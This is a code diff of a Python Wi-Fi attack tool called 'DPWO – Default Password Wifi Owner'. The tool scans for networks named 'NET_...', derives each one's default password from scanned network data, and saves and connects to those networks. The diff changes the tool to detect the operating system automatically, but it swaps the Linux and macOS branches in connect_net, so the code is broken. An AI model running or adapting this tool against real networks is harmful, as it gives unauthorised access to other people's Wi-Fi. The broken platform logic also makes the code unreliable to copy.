@@ -1,24 +1,24 @@
-import subprocess
-import argparse
+import subprocess , argparse , sys
 from re import compile
 from wifi import Cell, Scheme
 
 
 '''
-NET OWNER 0.3v
+DPWO
+Default Password Wifi Owner 0.3v
 '''
 
 AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"
 
 
 class NETOwner():
-    def __init__(self, mode, iface, regex='^NET_',
+    def __init__(self, iface, regex='^NET_',
                  airport=AIRPORT_PATH, verbosity=0):
-        self.mode = mode
         self.iface = iface
         self.regex = compile(regex)
         self.airport = airport
         self.verbosity = verbosity
+        self.os = sys.platform
 
     def osx_networks(self):
         scan = ''
@@ -41,11 +41,12 @@ class NETOwner():
             yield obj
 
     def scan_network(self):
-        if self.mode == 'osx':
-            scanner = self.osx_networks()
-        else:
-            scanner = self.linux_networks()
-
+        if self.os == "linux" or self.os == "linux2":
+           scanner = self.linux_networks()
+        elif self.os == "darwin":
+           scanner = self.osx_networks()
+        #elif os == "win32":
+            
         results = []
         for wifi in scanner:
             if self.verbosity > 1:
@@ -66,7 +67,7 @@ class NETOwner():
                 password = ''.join(chunks)
                 results.append([wifi[0], password, wifi[1]])
 
-                if self.mode != 'osx':
+                if self.os != 'darwin':
                     Scheme.for_cell(
                         self.iface, wifi[1], wifi[4], password
                     ).save()
@@ -74,10 +75,11 @@ class NETOwner():
         return results
 
     def connect_net(self, wifi):
-        if self.mode == 'osx':
-            status = self.connect_net_osx(wifi)
-        else:
-            status = self.connect_net_linux(wifi)
+        if self.os == "linux" or self.os == "linux2":
+           status = self.connect_net_osx(wifi)
+        elif self.os == "darwin":
+           status = self.connect_net_linux(wifi)
+        #elif os == "win32":
 
         return status
 
@@ -122,8 +124,7 @@ def parse_args():
     parser = argparse.ArgumentParser(
         formatter_class=argparse.ArgumentDefaultsHelpFormatter
     )
-    parser.add_argument("-m", "--mode", default="linux",
-                        help="Mode: osx or linux.")
+
     parser.add_argument("-i", "--interface", default="wlp3s0",
                         help="Network interface.")
     parser.add_argument("-r", "--regex", default="^NET_",
@@ -138,13 +139,12 @@ def parse_args():
 
 
 def main():
-    print("NET OWNER v0.3")
+    print("DPWO      v0.3")
     print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")
 
     args = parse_args()
 
     owner = NETOwner(
-        args.mode,
         args.interface,
         regex=args.regex,
         airport=args.airport,
